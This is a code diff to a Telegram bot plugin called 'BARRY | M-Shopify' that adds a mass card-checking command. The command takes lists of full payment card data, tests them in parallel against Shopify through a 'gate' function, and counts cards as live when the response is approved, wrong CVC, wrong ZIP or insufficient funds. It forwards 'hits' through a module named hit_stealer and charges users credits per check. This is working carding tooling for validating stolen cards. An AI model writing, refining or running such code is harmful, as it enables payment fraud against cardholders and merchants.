@@ -1,9 +1,9 @@
 from pyrogram import Client, filters
 import re, time, asyncio
+from datetime import date
 from plugins.func.users_sql import *
 from plugins.gates.func.mass_shopify_func import shopify_func
 from plugins.tools.hit_stealer import send_hit_if_approved
-from datetime import date
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 @Client.on_message(filters.command("msh", prefixes=["/", "."]))
@@ -67,57 +67,58 @@ async def cmd_msh(Client, message):
         if role == "PREMIUM" and len(cards) > 15:
             return await message.reply_text("Premium users can only check 15 cards.", message.id)
 
+        updatedata(user_id, "antispam_time", now)
         start_time = time.time()
-        stmsg = await message.reply_text("Please wait...⌛", reply_to_message_id=message.id)
 
-        text = "<b>BARRY | M-Shopify 0.99$</b>\n━━━━━━━━━━━━━\n"
+        total = len(cards)
+        stmsg = await message.reply("Please wait...⌛")
 
-        live, dec, err = 0, 0, 0
-
+        # Check all cards in parallel
         tasks = [shopify_func(None, c[0], c[3], c[1], c[2]) for c in cards]
         results = await asyncio.gather(*tasks)
 
-        for i, res in enumerate(results):
-            cc = f"{cards[i][0]}|{cards[i][1]}|{cards[i][2]}|{cards[i][3]}"
-            status = res.get("status", "❓")
-            msg = res.get("response", "No response")
+        text = ""
+        live = dec = err = 0
+
+        for i, res in enumerate(results, 1):
+            cc = f"{cards[i-1][0]}|{cards[i-1][1]}|{cards[i-1][2]}|{cards[i-1][3]}"
+            msg = res.get("response", "No response").upper()
+            status = res.get("status", "").upper()
             msg_lower = msg.lower()
 
             if "3ds" in msg_lower or "authentication" in msg_lower:
-                status = "Declined ❌"
+                status_text = "Declined ❌"
                 msg = "3DS Auth Required"
                 dec += 1
-            elif "request failed" in msg_lower or "error" in msg_lower:
-                status = "Error"
+            elif "error" in msg_lower or "failed" in msg_lower or "500" in msg_lower:
+                status_text = "Error ❗"
                 err += 1
             elif any(x in msg_lower for x in ["incorrect_zip", "incorrect_cvc", "cvc mismatch", "insufficient"]):
-                if "incorrect_zip" in msg_lower:
-                    status = "Approved ✅"
-                elif "incorrect_cvc" in msg_lower or "cvc mismatch" in msg_lower:
-                    status = "Approved ✅"
-                elif "insufficient" in msg_lower:
-                    status = "Approved ✅"
+                status_text = "Approved ✅"
                 live += 1
             elif "approved" in status.lower():
-                status = "Approved ✅"
+                status_text = "Approved ✅"
                 live += 1
                 await send_hit_if_approved(Client, f"<b>Live Hit (MSH)</b>\n<code>{cc}</code>\n<b>Response:</b> {msg}")
             else:
-                status = "Declined ❌"
+                status_text = "Declined ❌"
                 dec += 1
 
-            text += f"<b>⊙ Card:</b> <code>{cc}</code>\n<b>⊙ Status:</b> {status}\n<b>⊙ Result:</b> {msg}\n━━━━━━━━━━━━━\n"
+            if i == 1:
+                text = f"<b>BARRY | M-Shopify 0.99$</b>\nLimit: {len(cards)}/15\n━━━━━━━━━━━━━\n"
+
+            text += f"<b>⊙ Card:</b> <code>{cc}</code>\n<b>⊙ Status:</b> {status_text}\n<b>⊙ Result:</b> {msg}\n━━━━━━━━━━━━━\n"
+            await Client.edit_message_text(chat_id, stmsg.id, text)
+            await asyncio.sleep(1)
 
         elapsed = round(time.time() - start_time, 2)
         summary = f"[✓] Approved: {live}  |  [✘] Declined: {dec}  |  [!] Error: {err}"
-
         dev = '<a href="tg://user?id=6440962840">𝑩𝑨𝑹𝑹𝒀</a>'
-        text += f"{summary}\n<b>ϟ T/t:</b> 0.m {elapsed}s | P/x: [Live ⛅]\n"
-        text += f"<b>ϟ Checked By:</b> {user_name} [ {role} ]\n<b>⌥ Dev:</b> {dev}"
+        text += f"{summary}\n<b>[ϟ] T/t:</b> {elapsed}s | P/x: [Live ⛅]\n"
+        text += f"<b>[ϟ] Checked By:</b> {user_name} [ {role} ]\n<b>⌥ Dev:</b> {dev}"
 
         await Client.edit_message_text(chat_id, stmsg.id, text)
         updatedata(user_id, "credits", credit - len(cards))
-        updatedata(user_id, "antispam_time", now)
 
     except Exception as e:
-        await message.reply_text(f"❌ Mass Shopify Check Failed: {str(e)}")
+        await message.reply(f"❌ MSH Gate Failed:\n<code>{str(e)}</code>")
